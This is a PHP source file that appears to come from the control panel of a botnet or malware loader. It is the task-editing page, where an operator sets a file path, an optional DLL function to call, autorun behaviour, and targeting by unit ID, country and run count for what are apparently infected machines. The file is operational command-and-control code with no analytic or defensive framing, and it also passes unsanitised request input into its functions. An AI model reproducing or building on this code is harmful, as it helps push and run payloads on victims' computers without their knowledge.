<?php

   session_start();

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   include("Header.php");
   include("Functions.php");
   include("Cfg/Config.php");

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
            <tr style=background-color:#11101d; height=\"50\">
               <td>
                  <div align = center>
                     <font color=\"#E4E9F7\">" . $_SESSION['Name'] . $lang["_009"] . "</font>
                  </div>
               </td>
            </tr>
            <tr>
               <td>
                  <img src=\"Images\Ang.png\" align=\"top\"></img>
               </td>
            </tr>
         </table>";

   if(isset($_POST['submit'])) 
   { 
      $FT = $_POST['filetype'];

      if ($FT == 1)
      {
         if ($_POST['autorun'] == 1)
         {
            $FT = "6";
         }

         MakeTaskAlt($_POST['path']  . ":::" . $_POST['dllfunction'], $_POST['tid'], $_POST['comment'], $_POST['arc'], "0", $FT, $_POST['folder'], $_POST['count'], $_POST['unitid'], $_POST['unitsid'], $_POST['country'], $_POST['id'], $_POST['ctlimit']); 
      }
      else
      {
         if ($_POST['autorun'] == 1 && $FT == 0)
         {
            $FT = "5";
         }

         if ($_POST['autorun'] == 1 && $FT == 2)
         {
            $FT = "7";
         }

         MakeTaskAlt($_POST['path'], $_POST['tid'], $_POST['comment'], $_POST['arc'], $_POST['run'], $FT, $_POST['folder'], $_POST['count'], $_POST['unitid'], $_POST['unitsid'], $_POST['country'], $_POST['id'], $_POST['ctlimit']); 
      }

      echo "<meta http-equiv=\"refresh\" content=\"0; url=Show_Tasks.php\">"; 
   }
   else
   {
      if ($_SESSION['Name'] != $conf["observer_login"]) 
      {
         echo (EditTask($_GET['id'])); 
      }
      else
      {
         echo "<table border=\"0\" width=\"100%\" height=\"300\">
                  <tr>
                     <td>
                        <div align = center>" . $lang["0088"] . "</div>
                     </td>
                  </tr>
               </table>";
      }
   }
   
   include("Footer.php");
?> 